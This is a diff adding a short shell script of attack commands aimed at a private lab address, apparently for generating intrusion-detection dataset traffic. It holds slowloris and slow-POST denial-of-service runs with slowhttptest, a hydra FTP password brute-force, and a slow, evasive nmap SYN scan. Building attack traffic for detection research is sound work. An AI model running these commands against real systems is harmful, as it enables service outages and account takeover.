@@ -1,0 +1,24 @@
+slowhttptest -c 1000 -H -i 5 -r 200 -t GET -u http://172.16.1.2 -x 24 -p 3 
+hydra -L bruteforce_usernames.txt -P bruteforce_passwords.txt -t 4 -vV ftp://172.16.1.2 
+
+nmap -sS -T1 --scan-delay 500ms -p 22,80,443,3000,3001,8080 "172.16.1.2"
+
+timeout 180s slowhttptest \
+  -H \
+  -c 1000 \
+  -i 10 \
+  -r 200 \
+  -l 120 \
+  -t GET \
+  -u http://172.16.1.2/ \
+  -x 24 \
+  -p 3 \
+  -g \
+  -o ~/cicids_runs/slowloris_r1
+
+TARGET=172.16.1.2
+RUN=$(mktemp -d -p "$PWD" cicids17-test.XXXXXX)
+slowhttptest -B -c 100 -r 10 -i 5 -l 120 \
+  -t POST -u "http://$TARGET:3001/rest/user/login" \
+  -s 8192 -x 24 -p 3 \
+  -g -o "$RUN/slow_body"
